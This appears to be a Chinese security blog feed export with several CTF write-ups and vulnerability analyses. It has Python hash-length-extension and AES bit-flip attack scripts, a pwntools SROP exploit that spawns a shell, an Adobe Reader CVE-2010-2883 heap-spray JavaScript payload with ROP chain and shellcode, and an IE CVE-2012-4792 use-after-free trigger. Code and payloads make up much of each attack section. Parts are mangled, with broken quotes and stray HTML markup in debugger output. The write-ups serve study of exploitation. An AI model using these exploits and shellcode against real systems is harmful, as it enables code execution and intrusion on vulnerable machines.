利用vim恢复一下方法是，首先重命名为.index.php.swp,接着利用vim -r index.php即可恢复 源码如下&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type=“text/css”&gt; body { background:gray; text-align:center; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $auth = false; $role = “guest”; $salt = if (isset($_COOKIE[“role”])) { $role = unserialize($_COOKIE[“role”]); $hsh = $_COOKIE[“hsh”]; if ($role===“admin” &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[“role”]))) { $auth = true; } else { $auth = false; } } else { $s = serialize($role); setcookie(‘role’,$s); $hsh = md5($salt.strrev($s)); setcookie(‘hsh’,$hsh); } if ($auth) { echo “&lt;h3&gt;Welcome Admin. Your flag is } else { echo “&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;“; } ?&gt;&lt;/body&gt;&lt;/html&gt;方法一 利用hash_extender# -- coding:utf-8 --from urlparse import urlparsefrom httplib import HTTPConnectionfrom urllib import urlencodeimport jsonimport timeimport osimport urllibdef gao(x, y): #print x #print y url = “http://120.26.131.152:32778/“ cookie = “role=” + x + “; hsh=” + y #print cookie build_header = { ‘Cookie’: cookie, ‘User-Agent’: ‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0’, ‘Host’: ‘web.phrack.top:32785’, ‘Accept’: ‘text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8’, } urlparts = urlparse(url) conn = HTTPConnection(urlparts.hostname, urlparts.port or 80) conn.request(“GET”, urlparts.path, ‘’, build_header) resp = conn.getresponse() body = resp.read() return bodyfor i in xrange(1000): print i #secret len = ??? find_hash = “../hash_extender/hash_extender -d ‘;\”tseug\”:5:s’ -s 3a4727d57463f122833d9e732f94e4e0 -f md5 -a ‘;\”nimda\”:5:s’ –out-data-format=html -l “ + str(i) + “ –quiet” #print find_hash calc_res = os.popen(find_hash).readlines() print calc_res hash_value = calc_res[0][:32] attack_padding = calc_res[0][32:] attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1]) ret = gao(attack_padding, hash_value) if “Welcome” in ret: print ret break方法二 利用上述脚本只需简单的更改第二个脚本就好#!/usr/bin/env python# -- coding: utf-8 --# @Author：DshtAngerimport test1import hashlibimport urllibimport binasciiimport refrom Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long#reference:# http://www.freebuf.com/articles/web/69264.html#problem link:# http://ctf4.shiyanbar.com/web/kzhan.phpsamplehash=“3a4727d57463f122833d9e732f94e4e0”‘’’res = re.findall(‘.{8}’,samplehash)print ress = ‘03194d72’print cs1 = “”print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])‘’’s =[]res = re.findall(‘.{8}’,samplehash)print resfor i in res: ss = “” ss = ss.join([i[j-2]+i[j-1] for j in xrange(len(i),0,-2)]) s.append(bytes_to_long(binascii.a2b_hex(ss)))print [hex(i) for i in s]# 084e0343 a0486ff0 5530df6c 705c8bb4#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书s1=s[0]s2=s[1]s3=s[2]s4=s[3]#expsecret_admin=‘xxxxxxxxxxxx;”tseug”:5:s’+‘\x80’+‘\x00’31+‘\x18’+‘\x00’7+‘;”nimda”:5:s’r = test1.deal_rawInputMsg(secret_admin)inp = r[len(r)/2:] #我们需要截断的地方，也是我们需要控制的地方#print r;”tseug”:5:s#print inpprint “getmein:”+test1.run_md5(s1,s2,s3,s4,inp)print “getmein:”+hashlib.md5(secret_admin).hexdigest()代码中的xxxxx就是salt 但是首先我们要猜测长度 所以可以利用脚本写一个简单的爆破0x3 admin这道题目也是不错的考察了，hash扩展攻击技巧以及aes的相关加密方式题目我已经上传到github上面了链接主要还是代码审计step 1 初步审计访问backup_old.php会生成flag的加密内容index.php提供注册登录解密等功能要想实现解密必须是的admin的值为1step 2 直接解密(解法一)这里需要注意一下aes加密解密，是要16字节填充的。所以要控制一下用户名长度我们注册 username = xxxxxxxadmin|1|501530457b49501056d8f994d12252ca 就会得到加密的内容我们取前96位，因为明文已知所以最后一位字节翻转import binasciis = ‘7bbb9e011044a910a7c78694894637b75baf41106081282d35d171253cadcbbf24498a58a9ac5e5bdba9ed1c3f3badf6e5844ea87f28680454a847808321da8ce581b67e0c24bc6cab79cf8c9ce16074ae8a01456f3921f8a4bd654ceaf9da51’string = s[0:96]last_8 = binascii.a2b_hex(string[-2:])print len(last_8)plain = ‘|’mid = ‘’.join([chr(ord(last_8[i])^ord(plain[i])) for i in range(1)])final = ‘’.join([chr(ord(mid[i])^ord(‘\x01’)) for i in range(1)])print string[:-2]+binascii.b2a_hex(final)将token= login=501530457b49501056d8f994d12252castep 3 利用hash拓展攻击（没有必要）贴上脚本，hash生成还是以前的脚本#coding:utf-8import requestsimport timeimport reurl_register = ‘http://127.0.0.1/var/index.php?action=register‘url_login = ‘http://127.0.0.1/var/index.php?action=login‘url_manage = ‘http://127.0.0.1/var/index.php?action=manage‘url_back = ‘http://127.0.0.1/var/backup_old.php‘re1 = requests.session()def register(name,passwd): data = { ‘user’:name, ‘pwd’:passwd } re1.post(url_register,data=data)# login(‘kk’,’kk’)def login(name,passwd): data = { ‘user’:name, ‘pwd’:passwd } s = re1.post(url_login,data=data,allow_redirects=False) # print s.content return s.cookiestoken_fl = ‘’def attack(token,sign): global token_fl cookies ={ ‘sign’:sign, ‘token’:token, } s = re1.post(url_manage,data={‘do’:‘decrypt’},cookies=cookies) if ‘Password’ not in s.content: token_fl = tokendef test(token,sign): re1.post(url_back) srand = int(time.time()) r = re1.post(‘http://127.0.0.1/var/backup.txt‘) encrypt = r.content r = re1.post(‘http://127.0.0.1/2.php‘,data={‘a’:srand}) st = r.content string = ‘’.join([hex(ord(i))[2:] for i in st]) print st,string cookies ={ ‘sign’:sign, ‘token’:token, } s = re1.post(url_manage,data={‘do’:‘decrypt’,‘iv’:string,‘text’:encrypt},cookies=cookies) print s.content r = re.findall(‘(.{32,32})&lt;br /&gt;’,s.content) print ‘’.join([chr(int(‘0x’+r[0][i]+r[0][i+1],16)) for i in range(0,len(r[0]),2)])hash_ex = ‘e825bd41831d87fa7e8b84b5e6614ce5’name = ‘admin’+‘\x80’+‘\x00’40+‘\x78’+‘\x00’7+‘tadmin’+‘|1|’+hash_expasswd = ‘33’# register(name,passwd)rs = login(name,passwd)print rs[‘sign’],len(rs[‘token’][:190])# print rs[‘token’][:190]dic = []s = ‘0987654321abcdef’for i in s: for j in s: dic.append(i+j)for i in dic: attack(rs[‘token’][:190]+i,hash_ex)# print token_fltest(token_fl,hash_ex)]]></content>
      <tags>
        <tag>WEB漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞分析之CVE-2010-2883（栈溢出）]]></title>
    <url>%2F2017%2F07%2F02%2F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BCVE-2010-2883%EF%BC%88%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Adobe Acrobat和Reader都是美国Adobe公司开发的非常流行的PDF文件阅读器。 基于Window和Mac OS X的Adobe Reader和Acrobat 9.4之前的9.x版本，8.2.5之前的8.x版本的CoolType.dll中存在基于栈的缓冲区溢出漏洞。远程攻击者可借助带有TTF字体Smart INdependent Glyphlets (SING)表格中超长字段的PDF文 0x00 漏洞简介0x01 测试环境0x02 漏洞调试0x1 基于字符串定位的漏洞分析方法0x2 SING数据结构分析0x3 Ollydbg动态调试恶意数据跟踪调试ROP链构造0x4 heap spray技术应用0x03 漏洞验证之前调过一个关于浏览器的漏洞，因为第一次接触漏洞，所以很没有经验不知道最后怎么构造shellcode（特别是ROP链的写法），有幸再调试一个稍微简单点的CVE，具体查看poc中的ROP链编写。0x00 漏洞简介Adobe Acrobat和Reader都是美国Adobe公司开发的非常流行的PDF文件阅读器。 基于Window和Mac OS X的Adobe Reader和Acrobat 9.4之前的9.x版本，8.2.5之前的8.x版本的CoolType.dll中存在基于栈的缓冲区溢出漏洞。远程攻击者可借助带有TTF字体Smart INdependent Glyphlets (SING)表格中超长字段的PDF文件执行任意代码或者导致拒绝服务（应用程序崩溃）。0x01 测试环境虚拟机winxp sp3 32bitadobe Reader9.3.4利用OD以及IDA进行动静态结合的逆向分析0x02 漏洞调试0x1 基于字符串定位的漏洞分析方法首先进行漏洞定位，这是分析的起始步骤，找到漏洞产生的现场，作为一个典型的stack overflow的漏洞，最典型的函数就是Strcat函数，同时本漏洞出现的原因是在堆SING表格的解析上，所以我们可以直接利用IDA分析（CoolType.dll文件）定位漏洞所在位置，alt+t搜索SING字符 利用IDA静态查看出问题的CoolType.dll动态链接库.text:0803DCF9 push ebp.text:0803DCFA sub esp, 104h；分配栈空间0x104.text:0803DD00 lea ebp, [esp-4]；后面的strcat会把执行结果保存在ebp中.text:0803DD04 mov eax, dword_8230FB8.text:0803DD09 xor eax, ebp.text:0803DD0B mov [ebp+104h], eax.text:0803DD11 push 4Ch.text:0803DD13 mov eax, offset loc_8184A54.text:0803DD18 call __EH_prolog3_catch.text:0803DD1D mov eax, [ebp+arg_C].text:0803DD23 mov edi, [ebp+arg_0].text:0803DD29 mov ebx, [ebp+arg_4].text:0803DD2F mov [ebp+var_28], edi.text:0803DD32 mov [ebp+var_30], eax.text:0803DD35 call sub_804172C.text:0803DD3A xor esi, esi.text:0803DD3C cmp dword ptr [edi+8], 3.text:0803DD40 mov [ebp+var_4], esi.text:0803DD43 jz loc_803DF00.text:0803DD49 mov [ebp+var_1C], esi.text:0803DD4C mov [ebp+var_18], esi.text:0803DD4F cmp dword ptr [edi+0Ch], 1.text:0803DD53 mov byte ptr [ebp+var_4], 1.text:0803DD57 jnz loc_803DEA9.text:0803DD5D push offset aName ; “name”.text:0803DD62 push edi ; int.text:0803DD63 lea ecx, [ebp+var_1C].text:0803DD66 mov [ebp+var_11], 0.text:0803DD6A call sub_80217D7.text:0803DD6F cmp [ebp+var_1C], esi.text:0803DD72 jnz short loc_803DDDD.text:0803DD74 push offset aSing ; “SING”.text:0803DD79 push edi ; int.text:0803DD7A lea ecx, [ebp+var_24]；一个指向虚表的指针.text:0803DD7D call sub_8021B06；处理SING表.text:0803DD82 mov eax, [ebp+var_24].text:0803DD85 cmp eax, esi；判断是否为空.text:0803DD87 mov byte ptr [ebp+var_4], 2.text:0803DD8B jz short loc_803DDC4；这里不跳转.text:0803DD8D mov ecx, [eax]；字体资源版本号，这里是1.0版本.text:0803DD8F and ecx, 0FFFFh.text:0803DD95 jz short loc_803DD9F；这里跳转.text:0803DD97 cmp ecx, 100h.text:0803DD9D jnz short loc_803DDC0.text:0803DD9F.text:0803DD9F loc_803DD9F: ; CODE XREF: sub_803DCF9+9Cj.text:0803DD9F add eax, 10h；寻找uniqueName，相对sing表入口偏移0x10.text:0803DDA2 push eax ; Source.text:0803DDA3 lea eax, [ebp+0]；前面提到的申请的变量空间.text:0803DDA6 push eax ; Dest.text:0803DDA7 mov byte ptr [ebp+0], 0.text:0803DDAB call strcat；最后产生溢出的漏洞点由上述汇编代码来看，漏洞产生的根本原因是在copy字符串时没有对字符创的长度进行检测，导致恶意数据覆盖返回地址，造成栈溢出。0x2 SING数据结构分析这里介绍一款PDF二进制分析工具 PdfStreamDumper，用工具导入利用漏洞的PDF文件，在Object中找到Sing的Object，右键选择Save Decompressed Streams保存到本地。在保存的文件中能看到TableEntry数据结构typedef sturct_SING{ char tag[4];//“SING” ULONG checkSum;//校验和 ULONG offset;//相对文件偏移 ULONG length;//数据长度} TableEntry;根据TableEntry结构可知从SING入口偏移0x11c为SING真实数据，从书上知道了SING从真实数据偏移0x10为uniqueName域，从代码上可以看出strcat是将uniqueName复制到栈空间，直至遇到NULL字符串终止符。 0x3 Ollydbg动态调试打开Adobe Reader,OD附加,f9ctrl+g:803DD9F,f2Adobe Reader中打开msf.pdfOD中断到803DD9F处 这段汇编将已经在内存里的uniqueName域copy至程序所运行的栈中，查看相关内存已经找到了SING中的数据 从第一个4byte到最后一个覆盖的地址，可以发现有0x328-0x12C=0x1FC byte 一直执行到83DDAB，造成缓冲区溢出 溢出修改了一个虚表的指针使得指指向你精心构造的ROP链这里为了方便调试将刚刚写入占中的地址全部设上访问中断 这样以来就可以在接下来对刚刚复制的恶意数据进行跟踪，调试。恶意数据跟踪调试这里取了第一个字节 这里循环取出 在栈里面的恶意数据 注意这里取出的是4byte 将栈上的数据复制到0x491274 内存访问断点断在了 一个将0x495220c写入0x12e608内存处 到这里才到关键点，有一个调用虚表的指令，一开始虚表是存在栈上的，但是被我们溢出覆盖成了恶意地址 ROP链构造因为软件本身自带DEP数据保护，所以这里我们需要构造DEP链来绕过它，构造ROP链的过程很巧妙。大体绕过DEP的思路如下：利用heap spray的方法将将0x0c0c0c0c处的内存喷上自己的shellcode（这里的shellcode要伪造成用户堆栈，需要有大量的ROP以及函数调用参数组成）构造相关ROP使得0x0c0c0c0c成为当前程序的堆栈来执行伪造的堆栈这里我们采用了两条ROP指令将esp指向0x0c0c0c0c首先我们看一下构造的shellcode我们选取的ROP地址一个是0x4A82A714，另一个是0x4A80CB38,他们都位于icuncnv36.dll的地址空间，而在Adobe Reader的各个版本上，这个DLL两个地址不会随着改变，这也是我们选取他们的原因。我们看一下他们的汇编指令 0x4A80CB38 leave：mov esp,ebppop ebp使得sp指针指向0x4A82A714，这里很巧妙的应用了该指令0x4A82A714 现在栈顶应该是0x0c0c0c0c这样直接pop就直接可以到rop链那 最后成功到达rop链，这里总结一下ROP的精髓是控制esp也就是栈顶指针为你所用，其实是个栈翻转的作用，这里用了两次栈翻转，第一次没有shellcode，中间中转一下利用 第二个翻转将esp指到了shellcode的位置，这也ROP的巧妙之处吧。 一般运用stack pivot技术的时候一句xchg eax，esp就能够起到作用。下面就是执行shellcode的过程了 将shellcode写在可以执行的内存上，从而绕过了DEP0x4 heap spray技术应用&lt;script type=“text/javascript”&gt;var s = unescape( ‘%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u91be%u7e18%udb51%ud9c4%u2474%u5af4%uc931%u31b1%u7231%u0313%u1372%uea83%ufa6d%uad8b%u7965%u4e73%u1e75%uabfd%u1e44%ub899%uaef6%uede9%u45fa%u05bf%u2889%u2968%u863a%u044e%ubbbb%u07b3%uc63f%ue7e7%u097e%ue6fa%u7447%ubbf7%uf210%u2baa%u4e15%uc777%u5e65%u34ff%u613d%ueb2e%u3836%u0df0%u309b%u15b9%u7df8%uad73%u0aca%u6782%uf203%u4629%u01ac%u8e33%ufa0a%ue646%u8769%u3d50%u5310%ua6d4%u10b2%u034e%uf443%uc009%ub14f%u8e5e%u4453%ua4b2%ucd6f%u6b35%u95e6%uaf11%u4ea3%uf63b%u2009%ue844%u9df2%u62e0%uc91e%u2898%u0c74%u572e%u0e3a%u5830%u676a%ud301%uf0e5%u369e%u0e42%u1bd5%u87e2%uc9b0%uc5b7%u2442%uf3fb%ucdc0%u0783%ua7d8%u4c86%u5b5e%uunescapefa%u5b0b%udea9%u3819%u4d2c%u91c1%uf5cb%uee60’ );var a = unescape( “%” + “u” + “0” + “c” + “0” + “c” + “%u” + “0” + “c” + “0” + “c” );while (a.length + 20 + 8 &lt; 65536) a+=a;c = a.substring(0, (0x0c0c-0x24)/2);c += s;c += a;f = c.substring(0, 65536/2);while(f.length &lt; 0x80000) f += f;k = f.substring(0, 0x80000 - (0x1020-0x08) / 2);var NwBg = new Array();for (OYV=0;OYV&lt;0x1f0;OYV++) NwBg[OYV]=k+”s”;&lt;/script&gt;因为pdf支持javascript脚本，所以利用javascript代码进行内存喷射，将shellcode重复写到内存上0x03 漏洞验证选用的是msf生成的poc文件，主要功能是弹出计算器，下面结合该poc文件进行相关漏洞分析预测试漏洞执行成功]]></content>
      <tags>
        <tag>漏洞调试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux SROP 原理与攻击]]></title>
    <url>%2F2017%2F06%2F30%2FLinux%20SROP%20%E5%8E%9F%E7%90%86%E4%B8%8E%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。 理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。0x01 原理SROP的全称是Sigreturn Oriented Programming。在这里sigreturn是一个系统调用，它在unix系统发生signal的时候会被间接地调用。Signal这套机制在1970年代就被提出来并整合进了UNIX内核中，它在现在的操作系统中被使用的非常广泛，比如内核要杀死一个进程（kill -9 $PID），再比如为进程设置定时器，或者通知进程一些异常事件等等。当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。在这里我们主要理解sigreturn的意义是，去执行一段pop函数将堆栈中的值全部pop到寄存器中，相当于一个恢复现场的作用（攻击的时候主要运用的这一点）。在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例： 在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址rt_sigreturn，这个地址指向一段代码，在这段代码中会调用sigreturn系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向rt_sigreturn，所以，signal handler函数的最后一条ret指令会使得执行流跳转到这段sigreturn代码，被动地进行sigreturn系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及rt_sigreturn： 我们将这段内存称为一个Signal Frame。0x02 攻击利用0x1攻击流程如果理解了前面所描述的原理，那么利用方式很简单，直接篡改在堆栈中的数据，等到sigreturn的时候就可以大展伸手了。 攻击利用这一点 swing师傅已经写了传送门0x2 题目解析在这里我主要分析一道ctf题目，i春秋360比赛的smallest 拿到题目首先分析结构 三无产品 这里看到syscall，就想到用SROP技术syscall这个指令，它是根据rax寄存器的值来查询系统调用表，并执行对应函数。 syscall(rax,rdi,rsi,rdx) 我们看看反汇编代码的意思 syscall(0,0,$rsp,0x400)，相当于调用了read函数read(0,$rsp,0x400)1. target我们要最终获取shell权限，必须有写入“/bin/bash”的过程所以要用到read函数。 要有命令执行过程所以要有exec 要有固定的字符串地址所以要有地址泄露 这里是write函数因为write函数的系统调用编号是1所以可以直接跳转绕过xor ax，ax 使得第二次函数执行write函数下面需要frame结构写到栈里，但最后要调用sigreturn指令，所以这里要提前做好栈保留的工作，这里有个坑看了半天才看懂，最后的解释感觉还可以接受其他的工作倒没什么了，主要是理清思路，要知道代码中每一行是干什么的2.write函数地址泄露这里我们选用write函数的原因很简单就是因为系统调用ax=1时是write函数，所以这里选用它 代码如下from pwn import sh = process(“./pwn4”)begin = 0x4000b0syscall = 0x4000be# step 1 call write func to leak stack addrwrite_payload = p64(begin) + p64(begin) + p64(begin) #the sec place can be replaced by 0x4000b1 0x4000b2 why 3 addr becaus after write it went to read funcsh.send(write_payload)sh.send(“\xb3”)#attention can only send 1 byte to call write funcstack_addr = u64(sh.recv()[8:16])print hex(stack_addr)sh.interactive()3.构造frame结构这一步比较简单可以直接利用别人写好的框架SigreturnFrame 首先我们要构造一个read函数，作用是把我们输入的字符串放在已经泄露的栈地址上，这一步是为了写exec的frame和参数/bin/bash#read(0,stack_addr,0x400) frame = SigreturnFrame(kernel=“amd64”)frame = SigreturnFrame(kernel=“amd64”)frame.rax = constants.SYS_readframe.rdi = 0x0frame.rsi = stack_addr#这里和下面@值必须相同，因为是一个rop链frame.rdx = 0x400frame.rsp = stack_addr#@frame.rip = syscallframe = SigreturnFrame(kernel=“amd64”)frame.rax = constants.SYS_execveframe.rdi = stack_addr+0x300 # “/bin/sh” ‘s addr frame.rip = syscall4.sigreturn执行这里需要前面的的预留位goto_sigreturn_payload = p64(syscall_addr) + “\x00”(15 - 8) # sigreturn syscall is 15 s.send(goto_sigreturn_payload)第一个是注册ax然后rop到syscall那里去执行sigreturn，恢复现场 下面那个和这个功能一样5.完整expfrom pwn import sh = process(“./pwn4”)context.arch = “amd64”begin = 0x4000b0syscall = 0x4000be# step 1 call write func to leak stack addrwrite_payload = p64(begin) + p64(begin) + p64(begin) #the sec place can be replaced by 0x4000b1 0x4000b2 why 3 addr becaus after write it went to read funcsh.send(write_payload)sh.send(“\xb3”)#attention can only send 1 byte to call write funcstack_addr = u64(sh.recv()[8:16])print “stack_addr:”,hex(stack_addr)# step 2 create frame struct#read(0,stack_addr,0x400) frame = SigreturnFrame(kernel=“amd64”)frame.rax = constants.SYS_readframe.rdi = 0x0frame.rsi = stack_addrframe.rdx = 0x400frame.rsp = stack_addrframe.rip = syscallread_payload = p64(begin)+p64(11111)+str(frame)sh.send(read_payload)#step 3 excu sigreturn sigreturn_payload = p64(syscall)+7“\x00”sh.send(sigreturn_payload)#step 4 create frame structframe = SigreturnFrame(kernel=“amd64”)frame.rax = constants.SYS_execveframe.rdi = stack_addr+0x300frame.rip = syscallexecv_frame_payload = p64(begin) + p64(1111) + str(frame)#step 5 excu sigreturn execv_frame_payload_all = execv_frame_payload + (0x300 - len(execv_frame_payload))*“\x00” + “/bin/sh\x00”sh.send(execv_frame_payload_all)sh.send(sigreturn_payload)sh.interactive()]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞分析之CVE-2012-4792(UAF)]]></title>
    <url>%2F2017%2F06%2F29%2F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BCVE-2012-4792(UAF)%2F</url>
    <content type="text"><![CDATA[0x00 漏洞简介 2012年9月，通用漏洞与披露平台发布了一个存在IE浏览器的UAF漏洞。 报告指出：Microsoft Internet Explorer 6至9版本中的mshtml.dll中的CMshtmlEd::Exec函数中存在释放后使用漏洞。远程攻击者可利用该漏洞通过特制的网站，执行任意代码。 0x01 测试环境操作系统：Windows XP sp3浏览器：IE 8.00.6 0x00 漏洞简介2012年9月，通用漏洞与披露平台发布了一个存在IE浏览器的UAF漏洞。 报告指出：Microsoft Internet Explorer 6至9版本中的mshtml.dll中的CMshtmlEd::Exec函数中存在释放后使用漏洞。远程攻击者可利用该漏洞通过特制的网站，执行任意代码。 0x01 测试环境操作系统：Windows XP sp3浏览器：IE 8.00.6001.18702漏洞文件：mshtml 8.00.6001.18702调试器：windbg x86利用windbg辅助工具设置系统堆栈调试功能C:\Documents and Settings\Administrator&gt;gflags.exe -I iexplore.exe +hpa +ustCurrent Registry Settings for iexplore.exe executable are: 02001000 ust - Create user mode stack trace database hpa - Enable page heap0x02 漏洞验证首先给出一段简单的poc验证CVE漏洞&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;function exploit(){ var e0 = null; var e1 = null; var e2 = null; try { e0 = document.getElementById(“a”); e1 = document.createElement(“div”); e2 = document.createElement(“q”); e1.applyElement(e2); e1.appendChild(document.createElement(‘button’)); e1.applyElement(e0); e2.innerHTML = “”; e2.appendChild(document.createElement(‘body’)); } catch(e) { } CollectGarbage();}&lt;/script&gt;&lt;/head&gt;&lt;body onload=“exploit()”&gt;&lt;form id=“a”&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;利用windbg attach IE 后 输入g继续运行运行，点击运行阻止的内容 观察windbg中代码停止的位置 结果发现edi（目测是一个申请堆的地址）是无效地址，程序崩溃。 这里应该取对象的虚表时发现地址不可取 下面会有调用虚表中的函数操作，那才是我们需要控制程序流的地方。0x03 漏洞原理首先我们利用!heap –p –a edi查看堆的相关操作 我们从中可以看到，edi已经是释放后的堆了，这里mov eax,dword ptr[edi] 又对释放后的堆，再次使用。下面有几个关键的问题没有解决：什么时候创建的堆什么时候释放的堆什么时候使用的堆0x1 堆的创建为了方便查找堆的创建，在windbg加载IE后查看所有关于CButton的函数 我们可以得到一些有用的信息0:005&gt; x mshtml!CButton::*6a28f234 mshtml!CButton::HandleMessage = &lt;no type information&gt;6a28ee18 mshtml!CButton::s_classdescTagButton = &lt;no type information&gt;6a28ed83 mshtml!CButton::GetAAtype = &lt;no type information&gt;6a28f862 mshtml!CButton::GetValueHelper = &lt;no type information&gt;6a28ef62 mshtml!CButton::GetEnabled = &lt;no type information&gt;6a28f36a mshtml!CButton::GetThemeState = &lt;no type information&gt;6a28f75d mshtml!CButton::get_status = &lt;no type information&gt;6a28ee41 mshtml!CButton::CreateElement = &lt;no type information&gt;//很明显是一个按钮创建的过程6a28f035 mshtml!CButton::Notify = &lt;no type information&gt;6a0c4750 mshtml!CButton::s_StringTable = &lt;no type information&gt;6a28f1e0 mshtml!CButton::GetFocusShape = &lt;no type information&gt;6a28f8eb mshtml!CButton::SetStatusText = &lt;no type information&gt;6a28f70d mshtml!CButton::put_status = &lt;no type information&gt;6a28f128 mshtml!CButton::YieldCurrency = &lt;no type information&gt;6a0b0d8c mshtml!CButton::GetBtnHelper = &lt;no type information&gt;6a28ef95 mshtml!CButton::GetBorderInfo = &lt;no type information&gt;6a28f2f0 mshtml!CButton::ClickAction = &lt;no type information&gt;6a298d55 mshtml!CButton::createTextRange = &lt;no type information&gt;6a28f87d mshtml!CButton::SetValueHelper = &lt;no type information&gt;6a28eda5 mshtml!CButton::GetClassDesc = &lt;no type information&gt;6a28f3c2 mshtml!CButton::ApplyDefaultFormat = &lt;no type information&gt;6a28ef0d mshtml!CButton::GetSubmitInfo = &lt;no type information&gt;6a029d70 mshtml!CButton::s_apfnpdIHTMLButtonElement = &lt;no type information&gt;6a0ad720 mshtml!CButton::s_acpi = &lt;no type information&gt;6a0b0338 mshtml!CButton::GetNonThemedBorderInfo = &lt;no type information&gt;6a28f10b mshtml!CButton::AddCtxInfoToStream = &lt;no type information&gt;6a0c4740 mshtml!CButton::s_StringTableAggregate = &lt;no type information&gt;6a28f337 mshtml!CButton::GetThemeProperties = &lt;no type information&gt;6a28f7a3 mshtml!CButton::GetValue = &lt;no type information&gt;6a28edf4 mshtml!CButton::s_classdescButtonSubmit = &lt;no type information&gt;6a28eeb8 mshtml!CButton::Init2 = &lt;no type information&gt;6a188ee4 mshtml!CButton::s_apHdlDescs = &lt;no type information&gt;6a188f00 mshtml!CButton::s_ppropdescsInVtblOrderIHTMLButtonElement = &lt;no type information&gt;6a28ed27 mshtml!CButton::scalar deleting destructor&#39; = &amp;lt;no &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;information&lt;/span&gt;&amp;gt;//猜测是按钮销毁的过程&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;a0c4780 mshtml!CButton::s_AssocVTablePtr = &amp;lt;no &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;information&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;a0af828 mshtml!CButton::GetElement = &amp;lt;no &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;information&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;69e765&lt;/span&gt;f0 mshtml!CButton::vftable’ = &lt;no type information&gt;6a28edd0 mshtml!CButton::s_classdescButtonReset = &lt;no type information&gt;6a034f04 mshtml!CButton::vftable&#39; = &amp;lt;no &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;information&lt;/span&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;a28ed27 mshtml!CButton::vector deleting destructor’ = &lt;no type information&gt;6a28ed62 mshtml!CButton::SetAAtype = &lt;no type information&gt;6a28f9a6 